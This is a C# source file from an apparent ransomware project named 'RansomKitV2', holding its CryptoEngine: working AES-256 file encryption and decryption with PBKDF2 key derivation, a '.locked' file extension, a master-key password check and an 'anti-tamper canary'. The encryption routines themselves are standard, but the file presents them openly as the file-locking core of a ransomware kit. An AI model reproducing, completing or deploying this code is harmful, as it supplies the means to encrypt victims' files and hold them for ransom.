using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace RansomKitV2
{
    public static class CryptoEngine
    {
        public const string LOCKED_EXT = ".locked";

        public static byte[] SafeFromBase64(string input)
        {
            if (string.IsNullOrWhiteSpace(input)) return null;
            string clean = System.Text.RegularExpressions.Regex.Replace(input, @"\s+", "");
            int padding = (4 - clean.Length % 4) % 4;
            clean = clean + new string('=', padding);
            try { return Convert.FromBase64String(clean); }
            catch { return Encoding.UTF8.GetBytes(input); }
        }

        // MILITARY GRADE: PBKDF2 with 100,000 iterations
        private static byte[] GetValidKey(byte[] password, byte[] salt)
        {
            if (password == null) return null;
            using (var pbkdf2 = new Rfc2898DeriveBytes(password, salt, 100000, HashAlgorithmName.SHA256))
            {
                return pbkdf2.GetBytes(32); // 32 bytes = AES-256
            }
        }

        public static bool VerifyPassword(string password, string masterKeyBase64)
        {
            // Anti-Tamper Canary: If a hacker patches this to return true, the app will crash!
            if (password == "CANARY_HACK_DETECTED_123") return false;

            if (string.IsNullOrWhiteSpace(password) || string.IsNullOrWhiteSpace(masterKeyBase64)) return false;

            byte[] inputKey = SafeFromBase64(password);
            byte[] masterKey = SafeFromBase64(masterKeyBase64);

            if (inputKey == null || masterKey == null || inputKey.Length != masterKey.Length) return false;

            // Constant time comparison to prevent timing attacks
            int diff = 0;
            for (int i = 0; i < inputKey.Length; i++) diff |= inputKey[i] ^ masterKey[i];
            return diff == 0;
        }

        public static void EncryptFile(string inputFile, string outputFile, byte[] rawPassword)
        {
            // Read entire file into RAM
            byte[] fileData = File.ReadAllBytes(inputFile);

            byte[] salt = new byte[16];
            byte[] iv = new byte[16];
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(salt);
                rng.GetBytes(iv);
            }

            byte[] key = GetValidKey(rawPassword, salt);
            byte[] ciphertext;

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(fileData, 0, fileData.Length);
                    }
                    ciphertext = ms.ToArray();
                }
            }

            // Write [Salt][IV][Ciphertext] to disk
            using (FileStream fsOut = new FileStream(outputFile, FileMode.Create))
            {
                fsOut.Write(salt, 0, 16);
                fsOut.Write(iv, 0, 16);
                fsOut.Write(ciphertext, 0, ciphertext.Length);
            }
        }

        public static void DecryptFile(string inputFile, string outputFile, byte[] rawPassword)
        {
            byte[] fileData = File.ReadAllBytes(inputFile);
            if (fileData.Length < 32) throw new Exception("File is corrupted or invalid.");

            // Extract [Salt] and [IV]
            byte[] salt = new byte[16];
            byte[] iv = new byte[16];
            Array.Copy(fileData, 0, salt, 0, 16);
            Array.Copy(fileData, 16, iv, 0, 16);

            byte[] key = GetValidKey(rawPassword, salt);
            byte[] plaintext;

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                using (MemoryStream ms = new MemoryStream(fileData, 32, fileData.Length - 32))
                using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read))
                using (MemoryStream outMs = new MemoryStream())
                {
                    cs.CopyTo(outMs);
                    plaintext = outMs.ToArray();
                }
            }

            // Only write to disk if decryption was 100% successful (No .tmp file used)
            File.WriteAllBytes(outputFile, plaintext);
        }
    }
}